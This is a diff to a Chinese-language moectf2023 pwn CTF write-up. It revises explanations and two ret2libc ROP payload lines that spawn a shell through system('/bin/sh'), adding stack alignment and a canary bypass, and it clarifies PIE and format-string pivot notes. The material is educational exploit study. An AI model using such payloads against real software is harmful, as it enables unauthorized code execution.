@@ -43,7 +43,7 @@ sh.interactive()
 
 
 
-程序将文件描述符fd的信息复制到了new_fd，而new_fd的值为(4 * fd) | 0x29a，又因为open分配的从3开始，所以fd一开始为3，从而new_fd就是670，发送670即可拿到flag。
+程序将文件描述符fd的信息复制到了new_fd，而new_fd的值为`(4 * fd) | 0x29a`，又因为open分配的从3开始，所以fd一开始为3，从而new_fd就是670，发送670即可拿到flag。
 
 
 
@@ -207,8 +207,8 @@ print(hex(puts_addr))
 print(hex(system_addr))
 print(hex(binsh_addr))
 
-# 下面的这个将system函数放到puts函数的返回地址中，否则在main中直接调用会出现栈错误
-pad2 = b'a' * 0x58 + p64(pop_rdi) + p64(binsh_addr) + p64(puts_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
+# 注意在调用system函数的时候会检查栈对齐，若栈地址不是16字节对齐会引发段错误。所以我们这里可以用一个ret(pop rdi + 1)让rsp往下顺延0x8
+pad2 = b'a' * 0x58 + p64(pop_rdi + 1) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
 
 sh.sendline(pad2)
 sh.interactive()
@@ -248,7 +248,7 @@ sh.interactive()
 
 ## PIE_enabled
 
-从题目中可以看出程序开启了PIE保护，即程序加载的基址会变化，但是程序内不同函数的相对地址不变。打开IDA可以看到程序输出了Vuln的地址，拿到Vuln的地址后通过Vuln函数的加上偏移量可以确定其它函数或变量的地址。
+从题目中可以看出程序开启了PIE保护，即程序加载的基址会变化，但是程序内不同函数的相对地址不变。打开IDA可以看到程序输出了vuln的地址，拿到vuln的地址后通过vuln函数的加上偏移量可以确定其它函数或变量的地址。
 
 ![image-20230823105743926](./moectf2023-pwn-wp.assets/image-20230823105743926.png)
 
@@ -337,8 +337,8 @@ sleep(2)
 sh.sendline(b'0') # 跳过第一个输入
 sleep(2)
 
-# 将system函数放到puts函数的返回地址，否则程序异常终止
-pad = b'a' * 0x48 + p64(canary) + p64(0x1) + p64(pop_rdi) + p64(binsh_addr) + p64(puts_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
+# 注意栈对齐
+pad = b'a' * 0x48 + p64(canary) + p64(0x1) + p64(pop_rdi + 1) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
 sh.sendline(pad)
 sh.interactive()
 ```
@@ -704,7 +704,7 @@ sh.interactive()
 
 与上一道题不同，buf在bss段上的时候就不能用偏移量来构造了。这时应该用栈作为跳板，修改返回地址。我们可以将当前函数的返回地址(0xffffcfcc处)修改为后success函数的地址。
 
-利用动态调试可以寻找合适的跳板。这里我选用了ebp指针，ebp指针指向了一个栈内存，而指向的栈0xffffcfe8又指向了栈内存0xffffcff8。ebp的偏移量为6，0xffffcff8的偏移量为14。
+利用动态调试可以寻找合适的跳板。这里我选用了ebp指针，因为其指向的链比较长。ebp指针指向了一个栈内存，而指向的栈0xffffcfe8又指向了栈内存0xffffcff8。ebp的偏移量为6，0xffffcff8的偏移量为14。
 
 ![image-20230822214216226](./moectf2023-pwn-wp.assets/image-20230822214216226.png)
 
